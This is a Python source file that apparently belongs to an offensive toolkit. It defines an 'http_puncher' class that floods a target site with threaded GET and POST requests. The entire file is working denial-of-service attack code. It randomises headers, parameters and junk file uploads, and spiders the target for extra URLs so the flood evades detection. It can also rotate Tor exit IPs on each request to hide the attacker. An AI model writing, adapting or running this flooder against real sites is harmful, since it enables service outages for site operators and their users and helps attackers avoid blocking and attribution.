from bane.ddos.utils import *

class http_puncher(DDoS_Class):
    def __init__(
        self,
        u,
        send_files=True,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        urls=[],
        threads=500,
        timeout=5,
        duration=60,
        logs=False,
        tor=False,
        scrape_target=True,
        scraped_urls=32
    ):
        self.domain=u.split('://')[1].split('/')[0]
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = Common_Variables.user_agents_list
        self.method = method
        self.send_files=send_files
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.timeout = timeout
        self.tor = tor
        if scrape_target==True:
            if tor==True:
                proxy=Proxies_Getter.get_tor_socks5_proxy()
            else:
                proxy=None
            if logs==True:
                print('[i] Gathering more URLs to avoid detection by requesting the same URL...')
            self.urls=spider_url(self.target,cookie=cookie,proxy=proxy,max_pages=scraped_urls)
        if urls==[] or urls==None:
            self.urls=[self.target]
        elif type(urls)==str:
            self.urls=Files_Interface.read_file(urls)
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    req_session=requests.Session()
                    headers={'User-Agent':random.choice(Common_Variables.user_agents_list)}
                    headers.update({"Host":self.domain})
                    for l in range(random.randint(1, 5)):
                        ed = random.choice(Common_Variables.accept_encoding_list)
                        oi = random.randint(1, 3)
                        if oi == 2:
                            gy = 0
                            while gy < 1:
                                df = random.choice(Common_Variables.accept_encoding_list)
                                if df != ed:
                                    gy += 1
                            ed += ", "
                            ed += df
                    l = random.choice(Common_Variables.accept_language_list)
                    for n in range(random.randint(0, 5)):
                        l += ";q={},".format(round(random.uniform(0.1, 1), 1)) + random.choice(Common_Variables.accept_language_list)
                    kl = random.randint(1, 2)
                    if random.randint(0,1)==1:
                        headers.update({'Accept':random.choice(Common_Variables.accept_list)})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Language':random.choice(l)})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Encoding':ed})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Charset':random.choice(Common_Variables.accept_charset_list)})
                    if random.randint(0,1)==1:
                        headers.update({'Connection':'Keep-Alive'})
                        headers.update({'Keep-Alive':str(random.randint(100,1000))})
                    else:
                        headers.update({'Connection':'Close'})
                    if random.randint(0,1)==1:
                        headers.update({'Cache-Control':random.choice(Common_Variables.cache_control_list)})
                    if random.randint(0,1)==1:
                        s=Common_Variables.referers_list+self.urls
                        headers.update({'Referer':random.choice(s)})
                    header_keys = list(headers.keys())
                    random.shuffle(header_keys)
                    headers = {key: headers[key] for key in header_keys}
                    req_session.headers=OrderedDict(list(headers.items()))
                    if self.tor==True:
                        proxy=Proxies_Getter.get_tor_socks5_proxy(new_ip=True)
                    else:
                        proxy=None
                    url=random.choice(self.urls)
                    if self.method==1:
                        meth="get"
                    elif self.method==2:
                        meth='post'
                    else:
                        r=random.randint(1,2)
                        if r==1:
                            meth="get"
                        elif r==2:
                            meth='post'
                    if meth=='post':
                        data={}
                        files={}
                        if self.send_files==True:
                            files_count=random.randint(0,3)
                            for x in range(files_count):
                                parameter_name_len=random.randint(1,15)
                                parameter_name=''.join([random.choice(Common_Variables.source_string) for x in range(parameter_name_len)])
                                file_name_len=random.randint(1,15)
                                file_name=''.join([random.choice(Common_Variables.source_string) for x in range(file_name_len)])+'.'+random.choice(list(Common_Variables.files_upload.keys()))
                                file_content_len=random.randint(1,10240)
                                file_content=''.join([random.choice(Common_Variables.source_string) for x in range(file_content_len)])+'.'+random.choice(list(Common_Variables.files_upload.keys()))
                                files.update({parameter_name:(file_name,file_content)})
                        params_count=random.randint(0,5)
                        for x in range(params_count):
                            key_len=random.randint(0,15)
                            key=''.join([random.choice(Common_Variables.source_string) for x in range(key_len)])
                            val_len=random.randint(0,100)
                            val=''.join([random.choice(Common_Variables.source_string) for x in range(val_len)])
                            data.update({key:val})
                        if files=={}:
                            files=None
                        sess = requests.Session()
                        req = requests.Request(
                            method='POST', url=url, headers=headers, data=data, files=files, params={}
                        )
                        prep = req.prepare()
                        prep.url = url
                        header_keys = list(prep.headers.keys())
                        random.shuffle(header_keys)
                        post_headers = {key: prep.headers[key] for key in header_keys}
                        prep.headers=OrderedDict(list(post_headers.items()))
                        sess.send(prep, verify=False, proxies=proxy, timeout=self.timeout)
                        #req_session.post(url,data=data,files=files,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                    else:   
                        prm={}
                        params_count=random.randint(1,8)
                        for x in range(params_count):
                            key_len=random.randint(1,8)
                            key=''.join([random.choice(Common_Variables.source_string) for x in range(key_len)])
                            val_len=random.randint(0,32)
                            val=''.join([random.choice(Common_Variables.source_string) for x in range(val_len)])
                            prm.update({key:val})
                        req_session.get(url,params=prm,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                    self.counter+=1
                    if self.logs == True:
                                sys.stdout.write(
                                    "\rRequest: {} | Type: {}".format(
                                        self.counter, meth
                                    )
                                )
                                sys.stdout.flush()
                except Exception as ex:
                    #pass#raise(ex)
                    self.fails+=1
                time.sleep(0.1)
            self.kill()
        except Exception as e:
            pass#raise(e)